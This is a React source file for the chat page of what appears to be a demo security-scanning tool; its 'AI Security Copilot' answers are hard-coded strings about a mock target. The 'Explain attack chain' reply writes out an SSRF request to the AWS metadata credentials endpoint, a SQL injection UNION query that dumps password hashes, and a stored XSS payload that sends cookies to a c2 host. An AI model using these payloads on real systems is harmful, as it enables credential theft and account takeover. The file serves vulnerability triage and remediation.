"use client";
import { useState, useRef, useEffect } from "react";
import { FINDINGS } from "@/data/findings";
import { sevColor, pluginColor } from "@/lib/utils";
import { Bot, Send, Zap, AlertTriangle, CheckCircle } from "lucide-react";

interface Message {
  role: "user" | "ai";
  content: string;
  chips?: string[];
}

const CANNED: Record<string, Message> = {
  "Analyze all findings": {
    role: "ai",
    content: `I've analyzed the 8 findings from this scan session.

**Critical Risk Summary:**
The 3 Critical findings form a devastating attack chain:
1. **SSRF** (CVE pattern: Capital One breach) → Cloud credential theft
2. **SQL Injection** → Full database exfiltration  
3. **Stored XSS** → Mass session hijacking

**Highest Priority:**
Start with **SSRF** in \`/api/webhooks/test\`. The fact that it reaches the AWS EC2 metadata endpoint (169.254.x.x) means if exploited, the attacker gains temporary AWS credentials that can pivot to every other service in your cloud environment. This is your most dangerous finding.

**Attack Chain:**
An attacker could:
→ Use SSRF to steal IAM credentials
→ Use credentials to read the RDS database directly (bypassing SQL injection protections)  
→ Read all user data, then craft stored XSS payload
→ Deploy XSS to harvest session cookies from all authenticated users

**False Positive Assessment:**
All 8 findings have \`Confirmed\` or \`High\` confidence. Zero false positives detected in this scan.`,
    chips: ["Explain SSRF in detail", "Show attack chain", "Prioritize fixes"],
  },
  "Prioritize fixes": {
    role: "ai",
    content: `**Fix Priority (risk-based, not just severity):**

**Fix immediately (before next deployment):**
1. 🔴 SSRF — Block 169.254.169.254 egress. Add URL allowlist to webhook endpoint. 1-hour fix.
2. 🔴 SQL Injection — Parameterize the products search query. 30-minute fix.
3. 🟠 IDOR — Add \`WHERE user_id = :authenticated_user_id\` to all user resource queries. 2-hour fix.
4. 🟠 CSRF — Add \`SameSite=Strict\` to session cookie + CSRF token to password change endpoint. 1-hour fix.

**Fix this sprint:**
5. 🔴 Stored XSS — Add HTML encoding on output. Deploy DOMPurify. Configure CSP header.
6. 🟠 Path Traversal — Validate \`path.startsWith(allowedBase)\` before file read.
7. 🟡 Open Redirect — Allowlist: accept only relative paths in \`next\` parameter.

**Fix next sprint:**
8. 🟡 Security Headers — Add CSP, HSTS, X-Frame-Options in nginx config. 30-minute fix with high impact.

**Total estimated remediation time:** 12-16 engineering hours.`,
    chips: ["Generate fix for SSRF", "Generate fix for SQLi", "CVSS scores"],
  },
  "CVSS scores": {
    role: "ai",
    content: `**CVSS v3.1 Scores:**

| Finding | Vector | Score |
|---------|--------|-------|
| SSRF → AWS Metadata | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | **9.9 Critical** |
| SQL Injection | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | **8.8 High** |
| Stored XSS | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N | **8.7 High** |
| IDOR | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | **6.5 Medium** |
| CSRF | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N | **8.1 High** |
| Path Traversal | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | **6.5 Medium** |
| Open Redirect | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | **6.1 Medium** |
| Missing Headers | AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N | **3.7 Low** |

**Overall Project Risk Score: 8.2 / 10 (High)**`,
    chips: ["Generate executive report", "Explain attack chain", "Analyze all findings"],
  },
  "Explain attack chain": {
    role: "ai",
    content: `**Full Attack Chain — External Attacker → Cloud Takeover:**

\`\`\`
ATTACKER (external, no auth)
    │
    ▼
[1] Register free account at app.target.local
    │  Cost: ~30 seconds
    │
    ▼
[2] SSRF: POST /api/webhooks/test
    │  Payload: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
    │  Result: AWS AccessKeyId + SecretAccessKey + SessionToken stolen
    │
    ▼
[3] Use credentials with AWS CLI
    │  aws s3 ls  → enumerate all S3 buckets
    │  aws rds describe-db-instances  → find database endpoints
    │  aws ec2 describe-instances  → find internal network layout
    │
    ▼  
[4] SQL Injection (independent path):
    │  GET /api/products/search?q=' UNION SELECT email,password_hash,3,4 FROM users--
    │  Result: 50,000 user bcrypt hashes extracted
    │  Offline crack with Hashcat: ~10,000 guesses/sec on RTX 4090
    │
    ▼
[5] Stored XSS (separate attack for session harvest):
    │  PUT /api/profile/update: displayName=<script>fetch('//c2?c='+btoa(document.cookie))</script>
    │  Every user who views profile sends their session cookie
    │  Result: Mass session token collection → account takeover at scale
    │
    ▼
[6] FULL COMPROMISE: Cloud infrastructure + database + user accounts
\`\`\`

**Time to compromise:** Estimated 2-4 hours for a skilled attacker.`,
    chips: ["Prioritize fixes", "CVSS scores", "Generate executive report"],
  },
  "Generate executive report": {
    role: "ai",
    content: `**EXECUTIVE SECURITY ASSESSMENT SUMMARY**

**Target:** https://app.target.local  
**Assessment Date:** ${new Date().toLocaleDateString()}  
**Overall Risk Rating:** 🔴 CRITICAL

---

**Key Findings:**
The application contains 3 Critical and 3 High severity vulnerabilities that, when chained, enable complete infrastructure compromise.

**Business Impact:**
- Customer PII (50,000+ records) at risk of breach
- AWS cloud infrastructure exposed to takeover
- Regulatory exposure: GDPR (€20M / 4% global revenue), PCI DSS ($5,000–$100,000/month fines)
- Reputational damage if breached

**Required Actions:**
1. Emergency hotfix: SSRF, SQL Injection, CSRF (within 24 hours)
2. Sprint remediation: IDOR, XSS, Path Traversal (within 1 week)
3. Security headers: Deploy within 2 weeks

**Estimated Remediation Cost:** 12-16 engineering hours (~$2,400–$3,200)  
**Estimated Breach Cost if Unresolved:** $1.2M–$4.8M (IBM Cost of Data Breach Report 2024)

**Recommendation:** Halt new feature development until Critical findings are remediated.`,
    chips: ["Analyze all findings", "CVSS scores", "Prioritize fixes"],
  },
};

const QUICK_PROMPTS = ["Analyze all findings", "Prioritize fixes", "CVSS scores", "Explain attack chain", "Generate executive report"];

const INITIAL_MESSAGES: Message[] = [
  {
    role: "ai",
    content: `Hello, I'm your AI Security Copilot. I've analyzed the scan results for **app.target.local**.

**Quick Summary:**
- 🔴 **3 Critical** findings (SSRF, SQL Injection, Stored XSS)
- 🟠 **3 High** findings (IDOR, CSRF, Path Traversal)
- 🟡 **2 Medium** findings
- **8/8 findings verified** — zero false positives

The SSRF finding is your most urgent risk. I'd recommend starting there.

What would you like me to analyze?`,
    chips: QUICK_PROMPTS.slice(0, 3),
  },
];

export default function AIPage() {
  const [messages, setMessages] = useState<Message[]>(INITIAL_MESSAGES);
  const [input,    setInput]    = useState("");
  const [typing,   setTyping]   = useState(false);
  const chatRef = useRef<HTMLDivElement>(null);

  useEffect(() => { if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight; }, [messages]);

  const sendMessage = async (text: string) => {
    if (!text.trim()) return;
    const userMsg: Message = { role: "user", content: text };
    setMessages(m => [...m, userMsg]);
    setInput("");
    setTyping(true);
    await new Promise(r => setTimeout(r, 800 + Math.random() * 600));
    const response = CANNED[text] ?? {
      role: "ai" as const,
      content: `I've analyzed your query about "${text}" in the context of this scan session.\n\nBased on the 8 findings from app.target.local, the most relevant concern is the interaction between the **SSRF** and **SQL Injection** vulnerabilities, which together create a multi-vector attack path.\n\nWould you like me to:\n- Provide specific remediation code\n- Estimate the CVSS score\n- Generate a finding detail report`,
      chips: ["Analyze all findings", "Prioritize fixes", "CVSS scores"],
    };
    setMessages(m => [...m, response]);
    setTyping(false);
  };

  return (
    <div style={{ height: "100%", display: "flex", flexDirection: "column", overflow: "hidden" }}>
      {/* Header */}
      <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 14px", background: "var(--surface-2)", borderBottom: "1px solid var(--border)", flexShrink: 0 }}>
        <Bot size={14} color="var(--primary)" />
        <span style={{ fontSize: 12, fontWeight: 600, color: "var(--fg)" }}>AI Security Copilot</span>
        <span style={{ fontSize: 10, color: "var(--muted)", marginLeft: 4 }}>Powered by security analysis engine · Context: app.target.local · {FINDINGS.length} findings loaded</span>
        <div style={{ marginLeft: "auto", display: "flex", gap: 6 }}>
          {[
            { label: `${FINDINGS.filter(f=>f.severity==="Critical").length} Critical`, c: "#ef5350" },
            { label: `${FINDINGS.filter(f=>f.severity==="High").length} High`, c: "#ffb74d" },
            { label: "8/8 Verified", c: "var(--green)" },
          ].map(s => (
            <span key={s.label} className="pill" style={{ background: `${s.c}15`, color: s.c, border: `1px solid ${s.c}30` }}>{s.label}</span>
          ))}
        </div>
      </div>

      {/* Chat area */}
      <div ref={chatRef} style={{ flex: 1, overflowY: "auto", padding: "14px 16px" }}>
        {messages.map((m, i) => (
          <div key={i} style={{ display: "flex", gap: 10, marginBottom: 16, justifyContent: m.role === "user" ? "flex-end" : "flex-start" }}>
            {m.role === "ai" && (
              <div style={{ width: 28, height: 28, borderRadius: "50%", background: "rgba(255,107,53,0.12)", border: "1px solid rgba(255,107,53,0.3)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                <Bot size={14} color="var(--primary)" />
              </div>
            )}
            <div style={{ maxWidth: "80%" }}>
              <div style={{
                padding: "10px 14px", borderRadius: m.role === "user" ? "10px 2px 10px 10px" : "2px 10px 10px 10px",
                background: m.role === "user" ? "rgba(255,107,53,0.12)" : "var(--surface-2)",
                border: `1px solid ${m.role === "user" ? "rgba(255,107,53,0.25)" : "var(--border)"}`,
                fontSize: 12.5, color: "var(--fg)", lineHeight: 1.7,
                fontFamily: "var(--font-geist-sans, system-ui)",
                whiteSpace: "pre-wrap",
              }}>
                {m.content}
              </div>
              {m.chips && (
                <div style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
                  {m.chips.map(c => (
                    <button key={c} onClick={() => sendMessage(c)} className="btn-secondary" style={{ fontSize: 11 }}>
                      {c}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        ))}
        {typing && (
          <div style={{ display: "flex", gap: 10, marginBottom: 16 }}>
            <div style={{ width: 28, height: 28, borderRadius: "50%", background: "rgba(255,107,53,0.12)", border: "1px solid rgba(255,107,53,0.3)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <Bot size={14} color="var(--primary)" />
            </div>
            <div style={{ padding: "10px 14px", background: "var(--surface-2)", border: "1px solid var(--border)", borderRadius: "2px 10px 10px 10px" }}>
              <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
                {[0,1,2].map(i => (
                  <div key={i} style={{ width: 6, height: 6, borderRadius: "50%", background: "var(--primary)", animation: `blink 1s ease-in-out ${i*0.2}s infinite` }} />
                ))}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Quick prompts */}
      <div style={{ padding: "6px 14px", borderTop: "1px solid var(--border)", display: "flex", gap: 6, overflowX: "auto", flexShrink: 0 }}>
        {QUICK_PROMPTS.map(p => (
          <button key={p} onClick={() => sendMessage(p)} className="btn-secondary" style={{ fontSize: 11, flexShrink: 0 }}>
            <Zap size={10} color="var(--primary)" /> {p}
          </button>
        ))}
      </div>

      {/* Input */}
      <div style={{ padding: "8px 14px", borderTop: "1px solid var(--border)", display: "flex", gap: 8, flexShrink: 0, background: "var(--surface-2)" }}>
        <input
          className="tool-input"
          placeholder="Ask about findings, attack chains, remediation, CVSS scores…"
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); sendMessage(input); } }}
        />
        <button className="btn-primary" onClick={() => sendMessage(input)} disabled={!input.trim() || typing}>
          <Send size={12} />
        </button>
      </div>
    </div>
  );
}
